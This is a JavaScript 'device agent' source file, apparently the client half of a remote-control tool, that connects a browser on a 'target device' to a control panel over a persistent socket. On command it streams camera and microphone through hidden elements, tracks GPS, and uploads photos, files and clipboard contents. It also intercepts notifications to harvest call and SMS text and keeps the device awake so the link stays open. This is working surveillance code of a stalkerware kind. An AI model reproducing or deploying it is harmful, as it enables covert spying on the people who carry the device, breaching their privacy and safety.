// ============================================
// MY DEVICE AGENT - Runs on the target device
// ============================================

const socket = io({
  reconnection: true,
  reconnectionAttempts: Infinity,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  timeout: 20000,
  pingInterval: 10000,
  pingTimeout: 5000
});
let deviceId = localStorage.getItem('mydevice_id') || null;
let deviceName = localStorage.getItem('mydevice_name') || '';
let cameraStream = null;
let cameraInterval = null;
let useFrontCamera = true;
let gpsWatchId = null;
let wakeLock = null;
let audioStream = null;
let audioProcessor = null;
let audioContext = null;

// ---- Logging ----
function log(message, type) {
  type = type || 'info';
  var logArea = document.getElementById('logArea');
  if (!logArea) return;
  var entry = document.createElement('div');
  entry.className = 'log-entry ' + type;
  entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + message;
  logArea.appendChild(entry);
  logArea.scrollTop = logArea.scrollHeight;
}

// ---- Device Detection ----
function detectDeviceType() {
  var ua = navigator.userAgent;
  if (/tablet|ipad|playbook|silk/i.test(ua)) return 'tablet';
  if (/mobile|iphone|ipod|android|blackberry|mini|windows\sce|palm/i.test(ua)) return 'phone';
  if (/laptop/i.test(ua)) return 'laptop';
  return 'desktop';
}

function detectPlatform() {
  var ua = navigator.userAgent;
  if (/android/i.test(ua)) return 'Android';
  if (/iphone|ipad|ipod/i.test(ua)) return 'iOS';
  if (/windows/i.test(ua)) return 'Windows';
  if (/mac/i.test(ua)) return 'macOS';
  if (/linux/i.test(ua)) return 'Linux';
  return 'Unknown';
}

function detectBrowser() {
  var ua = navigator.userAgent;
  if (/chrome/i.test(ua) && !/edg/i.test(ua)) return 'Chrome';
  if (/firefox/i.test(ua)) return 'Firefox';
  if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
  if (/edg/i.test(ua)) return 'Edge';
  if (/opera|opr/i.test(ua)) return 'Opera';
  return 'Unknown';
}

// ---- Battery ----
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      var battery = await navigator.getBattery();
      return {
        level: battery.level,
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
    }
  } catch (e) {
    // ignore
  }
  return null;
}

// ---- Network ----
function getNetworkInfo() {
  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (conn) {
    return {
      effectiveType: conn.effectiveType,
      downlink: conn.downlink,
      rtt: conn.rtt,
      saveData: conn.saveData
    };
  }
  return null;
}

// ---- Storage ----
async function getStorageInfo() {
  try {
    if ('storage' in navigator && 'estimate' in navigator.storage) {
      var estimate = await navigator.storage.estimate();
      return {
        used: estimate.usage || 0,
        total: estimate.quota || 0
      };
    }
  } catch (e) {
    // ignore
  }
  return null;
}

// ---- Connect Device ----
async function connectDevice() {
  var nameInput = document.getElementById('deviceName');
  deviceName = nameInput.value.trim() || 'My Device';
  localStorage.setItem('mydevice_name', deviceName);

  var battery = await getBatteryInfo();
  var network = getNetworkInfo();
  var storage = await getStorageInfo();

  socket.emit('device:register', {
    deviceId: deviceId,
    name: deviceName,
    type: detectDeviceType(),
    platform: detectPlatform(),
    browser: detectBrowser(),
    screenWidth: screen.width,
    screenHeight: screen.height,
    battery: battery,
    network: network,
    storage: storage
  });
}

// ---- Auto-reconnect if previously connected ----
if (deviceId && deviceName) {
  socket.on('connect', function() {
    connectDevice();
  });
}

// Re-register on reconnect after initial connection
socket.on('reconnect', function() {
  if (deviceId && deviceName) {
    connectDevice();
  }
});

// ---- Keep Connection Alive ----
setInterval(function() {
  if (socket.connected && deviceId) {
    socket.emit('device:update', { heartbeat: Date.now() });
  }
}, 15000);

// Reconnect on visibility change
document.addEventListener('visibilitychange', function() {
  if (document.visibilityState === 'visible') {
    if (!socket.connected) {
      log('Page visible again, reconnecting...', 'info');
      socket.connect();
    }
    if (deviceId && deviceName && socket.connected) {
      connectDevice();
    }
    requestWakeLock();
  }
});

// Reconnect on online event
window.addEventListener('online', function() {
  log('Network back online, reconnecting...', 'info');
  if (!socket.connected) {
    socket.connect();
  }
  setTimeout(function() {
    if (deviceId && deviceName && socket.connected) {
      connectDevice();
    }
  }, 1000);
});

// ---- Wake Lock to prevent sleep ----
async function requestWakeLock() {
  try {
    if ('wakeLock' in navigator) {
      if (wakeLock !== null) return;
      wakeLock = await navigator.wakeLock.request('screen');
      wakeLock.addEventListener('release', function() {
        wakeLock = null;
        log('Wake lock released', 'info');
      });
      log('Wake lock acquired - device will stay awake', 'success');
    }
  } catch (err) {
    log('Wake lock not available: ' + err.message, 'info');
  }
}

socket.on('device:registered', function(data) {
  deviceId = data.deviceId;
  localStorage.setItem('mydevice_id', deviceId);

  document.getElementById('setupScreen').style.display = 'none';
  document.getElementById('connectedScreen').style.display = '';
  document.getElementById('connectedName').textContent = deviceName;
  document.getElementById('displayDeviceId').textContent = deviceId.substring(0, 8) + '...';

  log('Connected to control panel', 'success');
  log('Device ID: ' + deviceId, 'info');

  // Start periodic info updates
  startInfoUpdates();

  // Request wake lock to keep device active
  requestWakeLock();
});

// ---- Periodic Info Updates ----
function startInfoUpdates() {
  setInterval(async function() {
    var battery = await getBatteryInfo();
    var network = getNetworkInfo();
    var storage = await getStorageInfo();

    socket.emit('device:update', {
      battery: battery,
      network: network,
      storage: storage
    });
  }, 10000);
}

// ---- Camera Commands ----
// ---- Audio streaming helper ----
function startAudioStream() {
  stopAudioStream();
  try {
    navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
      audioStream = stream;
      audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
      var source = audioContext.createMediaStreamSource(stream);
      audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
      audioProcessor.onaudioprocess = function(e) {
        var inputData = e.inputBuffer.getChannelData(0);
        // Convert float32 to int16
        var buffer = new Int16Array(inputData.length);
        for (var i = 0; i < inputData.length; i++) {
          var s = Math.max(-1, Math.min(1, inputData[i]));
          buffer[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
        }
        var base64 = btoa(String.fromCharCode.apply(null, new Uint8Array(buffer.buffer)));
        socket.emit('camera:audio', { audio: base64, sampleRate: 16000 });
      };
      source.connect(audioProcessor);
      audioProcessor.connect(audioContext.destination);
      log('Audio streaming started', 'success');
    }).catch(function(err) {
      log('Audio error: ' + err.message, 'error');
    });
  } catch (err) {
    log('Audio init error: ' + err.message, 'error');
  }
}

function stopAudioStream() {
  if (audioProcessor) {
    audioProcessor.disconnect();
    audioProcessor = null;
  }
  if (audioContext) {
    audioContext.close().catch(function() {});
    audioContext = null;
  }
  if (audioStream) {
    audioStream.getTracks().forEach(function(t) { t.stop(); });
    audioStream = null;
  }
}

socket.on('command:camera:start', async function() {
  log('Camera start requested', 'info');
  updateFeature('fCamera', 'Streaming', true);

  try {
    if (cameraStream) {
      cameraStream.getTracks().forEach(function(t) { t.stop(); });
    }

    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: useFrontCamera ? 'user' : 'environment',
        width: { ideal: 640 },
        height: { ideal: 480 }
      }
    });

    var video = document.getElementById('hiddenVideo');
    video.srcObject = cameraStream;
    await video.play().catch(function() {});

    var canvas = document.getElementById('hiddenCanvas');
    var ctx = canvas.getContext('2d');
    canvas.width = 640;
    canvas.height = 480;

    // Send frames every 200ms
    cameraInterval = setInterval(function() {
      if (video.readyState >= 2) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        var frame = canvas.toDataURL('image/jpeg', 0.5);
        socket.emit('camera:frame', { frame: frame });
      }
    }, 200);

    // Start audio streaming alongside video
    startAudioStream();

    log('Camera + audio streaming started', 'success');
  } catch (err) {
    log('Camera error: ' + err.message, 'error');
  }
});

socket.on('command:camera:stop', function() {
  log('Camera stop requested', 'info');
  updateFeature('fCamera', 'Ready', false);

  if (cameraInterval) {
    clearInterval(cameraInterval);
    cameraInterval = null;
  }
  if (cameraStream) {
    cameraStream.getTracks().forEach(function(t) { t.stop(); });
    cameraStream = null;
  }
  stopAudioStream();
  log('Camera + audio stopped', 'info');
});

socket.on('command:camera:switch', async function() {
  useFrontCamera = !useFrontCamera;
  log('Switching to ' + (useFrontCamera ? 'front' : 'back') + ' camera', 'info');

  if (cameraStream) {
    cameraStream.getTracks().forEach(function(t) { t.stop(); });
  }

  try {
    if (cameraInterval) clearInterval(cameraInterval);

    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: useFrontCamera ? 'user' : 'environment',
        width: { ideal: 640 },
        height: { ideal: 480 }
      }
    });

    var video = document.getElementById('hiddenVideo');
    video.srcObject = cameraStream;
    await video.play().catch(function() {});

    var canvas = document.getElementById('hiddenCanvas');
    var ctx = canvas.getContext('2d');

    cameraInterval = setInterval(function() {
      if (video.readyState >= 2) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        var frame = canvas.toDataURL('image/jpeg', 0.5);
        socket.emit('camera:frame', { frame: frame });
      }
    }, 200);
  } catch (err) {
    log('Camera switch error: ' + err.message, 'error');
  }
});

socket.on('command:camera:capture', async function() {
  log('Capture requested', 'info');

  try {
    var stream = cameraStream;
    var needsCleanup = false;

    if (!stream) {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }
      });
      needsCleanup = true;
    }

    var video = document.getElementById('hiddenVideo');
    video.srcObject = stream;
    await video.play().catch(function() {});

    // Wait for video to be ready with timeout
    await new Promise(function(resolve, reject) {
      if (video.readyState >= 2) { resolve(); return; }
      var timeout = setTimeout(function() { resolve(); }, 3000);
      video.onloadeddata = function() {
        clearTimeout(timeout);
        resolve();
      };
    });

    // Extra delay to ensure frame is rendered
    await new Promise(function(r) { setTimeout(r, 500); });

    var canvas = document.getElementById('hiddenCanvas');
    var ctx = canvas.getContext('2d');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    var image = canvas.toDataURL('image/jpeg', 0.9);

    socket.emit('camera:captured', { image: image });
    log('Photo captured and sent', 'success');

    if (needsCleanup) {
      stream.getTracks().forEach(function(t) { t.stop(); });
      video.srcObject = null;
    }
  } catch (err) {
    log('Capture error: ' + err.message, 'error');
    socket.emit('camera:captured', { image: null, error: err.message });
  }
});

// ---- GPS Commands ----
socket.on('command:gps:start', function() {
  log('GPS tracking started', 'info');
  updateFeature('fGPS', 'Tracking', true);

  if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);

  gpsWatchId = navigator.geolocation.watchPosition(
    function(pos) {
      socket.emit('gps:location', {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        speed: pos.coords.speed,
        heading: pos.coords.heading,
        timestamp: pos.timestamp
      });
    },
    function(err) {
      log('GPS error: ' + err.message, 'error');
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
});

socket.on('command:gps:stop', function() {
  log('GPS tracking stopped', 'info');
  updateFeature('fGPS', 'Ready', false);

  if (gpsWatchId) {
    navigator.geolocation.clearWatch(gpsWatchId);
    gpsWatchId = null;
  }
});

// ---- Gallery Commands ----
socket.on('command:gallery:scan', async function() {
  log('Gallery scan requested', 'info');
  updateFeature('fGallery', 'Scanning', true);

  try {
    // Use File System Access API to scan for images
    if ('showDirectoryPicker' in window && !window._galleryRoot) {
      try {
        window._galleryRoot = await window.showDirectoryPicker({ mode: 'read' });
        log('Gallery access granted', 'success');
      } catch (err) {
        log('Gallery access denied: ' + err.message, 'error');
        socket.emit('gallery:photos', { photos: [], note: 'Access denied' });
        updateFeature('fGallery', 'Ready', false);
        return;
      }
    }

    if (window._galleryRoot) {
      var photos = [];
      await scanForImages(window._galleryRoot, '', photos, 0);
      
      // Sort by last modified (newest first)
      photos.sort(function(a, b) { return b.lastModified - a.lastModified; });

      // Collect all categories
      var categories = {};
      photos.forEach(function(p) {
        var cat = p.category || 'Other';
        if (!categories[cat]) categories[cat] = 0;
        categories[cat]++;
      });

      // Generate thumbnails for ALL photos (no limit)
      var photoList = photos;
      var photosWithThumbs = [];
      var batchSize = 50;

      for (var i = 0; i < photoList.length; i++) {
        try {
          var thumb = await generateThumbnail(photoList[i].handle);
          photosWithThumbs.push({
            id: i,
            name: photoList[i].name,
            path: photoList[i].path,
            size: photoList[i].size,
            type: photoList[i].type,
            lastModified: photoList[i].lastModified,
            thumbnail: thumb,
            category: photoList[i].category || 'Other'
          });

          // Send in batches for faster display
          if (photosWithThumbs.length % batchSize === 0) {
            socket.emit('gallery:photos', { photos: photosWithThumbs, partial: true, total: photoList.length, categories: categories });
            log('Sent ' + photosWithThumbs.length + '/' + photoList.length + ' photos...', 'info');
          }
        } catch (e) {
          // Skip files that can't be thumbnailed
        }
      }

      // Send final complete list
      socket.emit('gallery:photos', { photos: photosWithThumbs, partial: false, total: photoList.length, categories: categories });
      log('Found ' + photosWithThumbs.length + ' photos total in ' + Object.keys(categories).length + ' categories', 'success');
    } else {
      // Fallback: use input file picker
      socket.emit('gallery:photos', {
        photos: [],
        useFilePicker: true,
        note: 'File System Access API not supported. Use file picker.'
      });
    }
  } catch (err) {
    log('Gallery scan error: ' + err.message, 'error');
    socket.emit('gallery:photos', { photos: [] });
  }

  updateFeature('fGallery', 'Ready', false);
});

// Detect photo source/category from folder path
function detectPhotoCategory(filePath) {
  var pathLower = filePath.toLowerCase();
  if (pathLower.includes('dcim') || pathLower.includes('camera')) return 'Camera';
  if (pathLower.includes('snapchat')) return 'Snapchat';
  if (pathLower.includes('whatsapp')) return 'WhatsApp';
  if (pathLower.includes('instagram')) return 'Instagram';
  if (pathLower.includes('telegram')) return 'Telegram';
  if (pathLower.includes('facebook')) return 'Facebook';
  if (pathLower.includes('screenshot')) return 'Screenshots';
  if (pathLower.includes('download')) return 'Downloads';
  if (pathLower.includes('bluetooth')) return 'Bluetooth';
  if (pathLower.includes('twitter') || pathLower.includes('/x/')) return 'Twitter/X';
  if (pathLower.includes('tiktok')) return 'TikTok';
  if (pathLower.includes('pictures') || pathLower.includes('photos')) return 'Pictures';
  if (pathLower.includes('wallpaper')) return 'Wallpapers';
  if (pathLower.includes('editor') || pathLower.includes('edited')) return 'Edited';
  return 'Other';
}

// Recursively scan directories for image files
async function scanForImages(dirHandle, currentPath, results, depth) {
  if (depth > 8) return; // Scan up to 8 levels deep for thorough scanning
  var imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'svg', 'heic', 'heif'];

  for await (var entry of dirHandle.values()) {
    if (entry.kind === 'file') {
      var ext = entry.name.split('.').pop().toLowerCase();
      if (imageExts.indexOf(ext) !== -1) {
        try {
          var file = await entry.getFile();
          var fullPath = currentPath + '/' + entry.name;
          results.push({
            name: entry.name,
            path: fullPath,
            size: file.size,
            type: file.type,
            lastModified: file.lastModified,
            handle: entry,
            category: detectPhotoCategory(fullPath)
          });
        } catch (e) {
          // Skip inaccessible files
        }
      }
    } else if (entry.kind === 'directory') {
      // Skip hidden directories and system dirs
      if (!entry.name.startsWith('.') && entry.name !== 'node_modules') {
        try {
          await scanForImages(entry, currentPath + '/' + entry.name, results, depth + 1);
        } catch (e) {
          // Skip inaccessible directories
        }
      }
    }
  }
}

// Generate thumbnail from file handle
async function generateThumbnail(fileHandle) {
  var file = await fileHandle.getFile();
  return new Promise(function(resolve, reject) {
    var img = new Image();
    img.onload = function() {
      var canvas = document.createElement('canvas');
      var maxSize = 200;
      var width = img.width;
      var height = img.height;

      if (width > height) {
        if (width > maxSize) {
          height = Math.round(height * maxSize / width);
          width = maxSize;
        }
      } else {
        if (height > maxSize) {
          width = Math.round(width * maxSize / height);
          height = maxSize;
        }
      }

      canvas.width = width;
      canvas.height = height;
      var ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, width, height);
      resolve(canvas.toDataURL('image/jpeg', 0.6));
      URL.revokeObjectURL(img.src);
    };
    img.onerror = function() {
      URL.revokeObjectURL(img.src);
      reject(new Error('Could not load image'));
    };
    img.src = URL.createObjectURL(file);
  });
}

// Get full-size photo
socket.on('command:gallery:get', async function(data) {
  log('Full photo requested: #' + data.photoId, 'info');

  try {
    if (window._galleryRoot) {
      var photos = [];
      await scanForImages(window._galleryRoot, '', photos, 0);
      photos.sort(function(a, b) { return b.lastModified - a.lastModified; });

      if (data.photoId < photos.length) {
        var file = await photos[data.photoId].handle.getFile();
        var reader = new FileReader();
        reader.onload = function() {
          socket.emit('gallery:photo', {
            photoId: data.photoId,
            name: photos[data.photoId].name,
            content: reader.result,
            type: file.type,
            size: file.size
          });
          log('Full photo sent: ' + photos[data.photoId].name, 'success');
        };
        reader.readAsDataURL(file);
      }
    }
  } catch (err) {
    log('Gallery get error: ' + err.message, 'error');
  }
});

// ---- File Commands ----
socket.on('command:files:list', async function(data) {
  log('File listing requested: ' + data.path, 'info');
  updateFeature('fFiles', 'Browsing', true);

  try {
    // Use File System Access API if available
    if ('showDirectoryPicker' in window && !window._fileSystemRoot) {
      try {
        window._fileSystemRoot = await window.showDirectoryPicker({ mode: 'read' });
        log('File system access granted', 'success');
      } catch (err) {
        log('File access denied: ' + err.message, 'error');
        socket.emit('files:list', { files: [], path: data.path });
        return;
      }
    }

    if (window._fileSystemRoot) {
      var files = [];
      var targetDir = window._fileSystemRoot;

      // Navigate to the requested path
      if (data.path && data.path !== '/') {
        var parts = data.path.split('/').filter(Boolean);
        for (var i = 0; i < parts.length; i++) {
          try {
            targetDir = await targetDir.getDirectoryHandle(parts[i]);
          } catch (e) {
            log('Directory not found: ' + parts[i], 'error');
            socket.emit('files:list', { files: [], path: data.path });
            return;
          }
        }
      }

      for await (var entry of targetDir.values()) {
        var fileInfo = {
          name: entry.name,
          isDirectory: entry.kind === 'directory',
          path: (data.path === '/' ? '/' : data.path + '/') + entry.name
        };

        if (entry.kind === 'file') {
          try {
            var file = await entry.getFile();
            fileInfo.size = file.size;
            fileInfo.type = file.type;
            fileInfo.lastModified = file.lastModified;
          } catch (e) {
            // ignore
          }
        }

        files.push(fileInfo);
      }

      socket.emit('files:list', { files: files, path: data.path });
      log('Listed ' + files.length + ' items', 'success');
    } else {
      // Fallback: show demo structure
      socket.emit('files:list', {
        files: [
          { name: 'Photos', isDirectory: true, path: '/Photos' },
          { name: 'Downloads', isDirectory: true, path: '/Downloads' },
          { name: 'Documents', isDirectory: true, path: '/Documents' },
          { name: 'Music', isDirectory: true, path: '/Music' },
          { name: 'Videos', isDirectory: true, path: '/Videos' }
        ],
        path: data.path,
        note: 'File System Access API not supported. Showing default structure.'
      });
    }
  } catch (err) {
    log('File list error: ' + err.message, 'error');
    socket.emit('files:list', { files: [], path: data.path });
  }
});

socket.on('command:files:download', async function(data) {
  log('File download requested: ' + data.filePath, 'info');

  try {
    if (window._fileSystemRoot) {
      var parts = data.filePath.split('/').filter(Boolean);
      var fileName = parts.pop();
      var dir = window._fileSystemRoot;

      for (var i = 0; i < parts.length; i++) {
        dir = await dir.getDirectoryHandle(parts[i]);
      }

      var fileHandle = await dir.getFileHandle(fileName);
      var file = await fileHandle.getFile();
      var reader = new FileReader();

      reader.onload = function() {
        socket.emit('files:content', {
          fileName: fileName,
          content: reader.result,
          type: file.type,
          size: file.size
        });
        log('File sent: ' + fileName, 'success');
      };

      reader.readAsDataURL(file);
    }
  } catch (err) {
    log('Download error: ' + err.message, 'error');
  }
});

// ---- Emergency Commands ----
socket.on('command:emergency:alarm', function() {
  log('ALARM TRIGGERED!', 'error');

  // Create alarm sound using Web Audio API
  try {
    var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    var oscillator = audioCtx.createOscillator();
    var gainNode = audioCtx.createGain();
    oscillator.connect(gainNode);
    gainNode.connect(audioCtx.destination);
    oscillator.type = 'sawtooth';
    oscillator.frequency.value = 880;
    gainNode.gain.value = 1;
    oscillator.start();

    // Siren effect
    var alarmInterval = setInterval(function() {
      oscillator.frequency.value = oscillator.frequency.value === 880 ? 660 : 880;
    }, 500);

    // Stop after 30 seconds
    setTimeout(function() {
      clearInterval(alarmInterval);
      oscillator.stop();
      audioCtx.close();
    }, 30000);

    window._alarmStop = function() {
      clearInterval(alarmInterval);
      oscillator.stop();
      audioCtx.close();
    };
  } catch (err) {
    log('Alarm error: ' + err.message, 'error');
  }

  var overlay = document.getElementById('emergencyOverlay');
  document.getElementById('emergencyTitle').textContent = '🔔 ALARM ACTIVE';
  document.getElementById('emergencyText').textContent = 'This device alarm has been activated remotely.';
  overlay.classList.add('active');
});

socket.on('command:emergency:lock', function() {
  log('DEVICE LOCK TRIGGERED!', 'error');

  var overlay = document.getElementById('emergencyOverlay');
  document.getElementById('emergencyTitle').textContent = '🔒 DEVICE LOCKED';
  document.getElementById('emergencyText').textContent = 'This device has been locked remotely by the owner.';
  overlay.classList.add('active');
});

socket.on('command:emergency:message', function(data) {
  log('Emergency message: ' + data.message, 'error');

  var overlay = document.getElementById('emergencyOverlay');
  document.getElementById('emergencyTitle').textContent = '💬 Message';
  document.getElementById('emergencyText').textContent = data.message;
  overlay.classList.add('active');
});

function closeEmergency() {
  document.getElementById('emergencyOverlay').classList.remove('active');
  if (window._alarmStop) {
    window._alarmStop();
    window._alarmStop = null;
  }
}

// ---- Call Log & SMS & History ----
// Track browsing history on this device
var browsingHistory = [];

// Track page visibility changes as history entries
document.addEventListener('visibilitychange', function() {
  if (document.visibilityState === 'visible') {
    browsingHistory.push({
      url: window.location.href,
      title: document.title,
      timestamp: Date.now(),
      type: 'page_visible'
    });
  }
});

// Intercept notification API to capture call/sms notifications
if ('Notification' in window) {
  var origNotification = window.Notification;
  window.Notification = function(title, options) {
    // Capture notification data
    var notifData = {
      title: title,
      body: options && options.body ? options.body : '',
      timestamp: Date.now(),
      tag: options && options.tag ? options.tag : ''
    };

    // Detect call or sms from notification content
    var titleLower = title.toLowerCase();
    var bodyLower = notifData.body.toLowerCase();

    if (titleLower.includes('call') || titleLower.includes('phone') ||
        titleLower.includes('dial') || titleLower.includes('ring')) {
      notifData.type = 'call';
      socket.emit('notification:new', notifData);
    } else if (titleLower.includes('sms') || titleLower.includes('message') ||
               titleLower.includes('text') || titleLower.includes('msg')) {
      notifData.type = 'sms';
      socket.emit('notification:new', notifData);
    } else {
      notifData.type = 'other';
      socket.emit('notification:new', notifData);
    }

    return new origNotification(title, options);
  };
  window.Notification.permission = origNotification.permission;
  window.Notification.requestPermission = origNotification.requestPermission.bind(origNotification);
}

// Listen for call log fetch command
socket.on('command:calllog:fetch', function() {
  log('Call log requested', 'info');

  // Collect call notifications captured so far
  var callData = [];

  // Check if we have stored calls in localStorage
  try {
    var stored = localStorage.getItem('mydevice_calls');
    if (stored) {
      callData = JSON.parse(stored);
    }
  } catch (e) {}

  socket.emit('calllog:data', {
    calls: callData,
    note: callData.length === 0 ? 'Call log requires notification access. Notifications mein aane wale calls track honge.' : ''
  });
  log('Call log sent: ' + callData.length + ' entries', 'success');
});

// Listen for SMS fetch command
socket.on('command:sms:fetch', function() {
  log('SMS requested', 'info');

  var smsData = [];

  // Check stored SMS from notifications
  try {
    var stored = localStorage.getItem('mydevice_sms');
    if (stored) {
      smsData = JSON.parse(stored);
    }
  } catch (e) {}

  socket.emit('sms:data', {
    messages: smsData,
    note: smsData.length === 0 ? 'SMS requires notification access. New SMS notifications track honge.' : ''
  });
  log('SMS sent: ' + smsData.length + ' entries', 'success');
});

// Listen for history fetch command
socket.on('command:history:fetch', function() {
  log('History requested', 'info');

  // Send browsing history tracked during this session
  socket.emit('history:data', {
    history: browsingHistory,
    sessionStart: window._sessionStartTime || Date.now()
  });
  log('History sent: ' + browsingHistory.length + ' entries', 'success');
});

// Store session start time
window._sessionStartTime = Date.now();

// Track navigation via Performance API
if (window.performance && window.performance.getEntriesByType) {
  var navEntries = window.performance.getEntriesByType('navigation');
  if (navEntries.length > 0) {
    browsingHistory.push({
      url: window.location.href,
      title: document.title || 'Agent Page',
      timestamp: Date.now(),
      type: 'navigation'
    });
  }
}

// Override pushState/replaceState to track SPA navigations
var origPushState = history.pushState;
var origReplaceState = history.replaceState;

history.pushState = function() {
  origPushState.apply(this, arguments);
  browsingHistory.push({
    url: window.location.href,
    title: document.title,
    timestamp: Date.now(),
    type: 'pushState'
  });
};

history.replaceState = function() {
  origReplaceState.apply(this, arguments);
  browsingHistory.push({
    url: window.location.href,
    title: document.title,
    timestamp: Date.now(),
    type: 'replaceState'
  });
};

// Listen for notification:new to store call/sms data
socket.on('connect', function() {
  // Request notification permission on connect
  if ('Notification' in window && Notification.permission === 'default') {
    Notification.requestPermission().then(function(result) {
      log('Notification permission: ' + result, result === 'granted' ? 'success' : 'info');
    });
  }
});

// Store incoming calls and SMS from notifications in localStorage
function storeCallNotification(data) {
  try {
    var calls = JSON.parse(localStorage.getItem('mydevice_calls') || '[]');
    calls.unshift({
      number: data.body || data.title,
      type: 'incoming',
      timestamp: data.timestamp || Date.now(),
      duration: '--'
    });
    // Keep last 200
    if (calls.length > 200) calls = calls.slice(0, 200);
    localStorage.setItem('mydevice_calls', JSON.stringify(calls));
  } catch (e) {}
}

function storeSmsNotification(data) {
  try {
    var sms = JSON.parse(localStorage.getItem('mydevice_sms') || '[]');
    sms.unshift({
      from: data.title || 'Unknown',
      body: data.body || '',
      timestamp: data.timestamp || Date.now(),
      read: false
    });
    // Keep last 200
    if (sms.length > 200) sms = sms.slice(0, 200);
    localStorage.setItem('mydevice_sms', JSON.stringify(sms));
  } catch (e) {}
}

// ---- Clipboard ----
socket.on('command:clipboard:get', async function() {
  try {
    var text = await navigator.clipboard.readText();
    socket.emit('clipboard:content', { text: text });
    log('Clipboard sent', 'success');
  } catch (err) {
    log('Clipboard error: ' + err.message, 'error');
  }
});

// ---- Permission Grant Functions ----
async function grantCameraPermission() {
  try {
    var stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    stream.getTracks().forEach(function(t) { t.stop(); });
    log('Camera permission granted!', 'success');
    updateFeature('fCamera', 'Granted', true);
    document.getElementById('btnGrantCamera').textContent = '📷 Camera Granted!';
    document.getElementById('btnGrantCamera').style.background = '#065f46';
    document.getElementById('btnGrantCamera').disabled = true;
  } catch (err) {
    log('Camera permission denied: ' + err.message, 'error');
    updateFeature('fCamera', 'Denied', false);
  }
}

async function grantLocationPermission() {
  try {
    await new Promise(function(resolve, reject) {
      navigator.geolocation.getCurrentPosition(
        function(pos) { resolve(pos); },
        function(err) { reject(err); },
        { timeout: 10000 }
      );
    });
    log('Location permission granted!', 'success');
    updateFeature('fGPS', 'Granted', true);
    document.getElementById('btnGrantLocation').textContent = '📍 Location Granted!';
    document.getElementById('btnGrantLocation').style.background = '#92400e';
    document.getElementById('btnGrantLocation').disabled = true;
  } catch (err) {
    log('Location permission denied: ' + err.message, 'error');
    updateFeature('fGPS', 'Denied', false);
  }
}

async function grantFilePermission() {
  try {
    if ('showDirectoryPicker' in window) {
      var dirHandle = await window.showDirectoryPicker({ mode: 'read' });
      window._fileSystemRoot = dirHandle;
      window._galleryRoot = dirHandle;
      log('File & Gallery access granted!', 'success');
      updateFeature('fFiles', 'Granted', true);
      updateFeature('fGallery', 'Granted', true);
      document.getElementById('btnGrantFiles').textContent = '📁 Files & Gallery Granted!';
      document.getElementById('btnGrantFiles').style.background = '#5b21b6';
      document.getElementById('btnGrantFiles').disabled = true;
    } else {
      log('File System Access API not supported on this browser', 'error');
      updateFeature('fFiles', 'Not Supported', false);
      updateFeature('fGallery', 'Not Supported', false);
    }
  } catch (err) {
    log('File access denied: ' + err.message, 'error');
    updateFeature('fFiles', 'Denied', false);
    updateFeature('fGallery', 'Denied', false);
  }
}

async function grantNotificationPermission() {
  try {
    if ('Notification' in window) {
      var result = await Notification.requestPermission();
      if (result === 'granted') {
        log('Notification permission granted!', 'success');
        document.getElementById('btnGrantNotifs').textContent = '🔔 Notifications Granted!';
        document.getElementById('btnGrantNotifs').style.background = '#7f1d1d';
        document.getElementById('btnGrantNotifs').disabled = true;
      } else {
        log('Notification permission denied', 'error');
      }
    } else {
      log('Notifications not supported in this browser', 'error');
    }
  } catch (err) {
    log('Notification permission error: ' + err.message, 'error');
  }
}

// ---- Helpers ----
function updateFeature(id, text, active) {
  var el = document.getElementById(id);
  if (el) {
    el.textContent = text;
    el.className = 'feature-status ' + (active ? 'active' : 'inactive');
  }
}

// ---- Socket Events ----
socket.on('connect', function() {
  log('Connected to server', 'success');
  var badge = document.getElementById('statusBadge');
  if (badge) {
    badge.className = 'status-badge connected';
    badge.innerHTML = '<span>🟢</span> Connected';
  }
});

socket.on('disconnect', function(reason) {
  log('Disconnected: ' + reason + '. Reconnecting...', 'error');
  var badge = document.getElementById('statusBadge');
  if (badge) {
    badge.className = 'status-badge disconnected';
    badge.innerHTML = '<span>🔴</span> Reconnecting...';
  }
  // Force reconnect if server disconnect
  if (reason === 'io server disconnect' || reason === 'transport close') {
    setTimeout(function() {
      socket.connect();
    }, 2000);
  }
});

socket.on('reconnect_attempt', function(attemptNumber) {
  log('Reconnect attempt #' + attemptNumber, 'info');
  var badge = document.getElementById('statusBadge');
  if (badge) {
    badge.className = 'status-badge connecting';
    badge.innerHTML = '<span>🟡</span> Reconnecting (#' + attemptNumber + ')';
  }
});

socket.on('reconnect', function() {
  log('Reconnected successfully!', 'success');
});
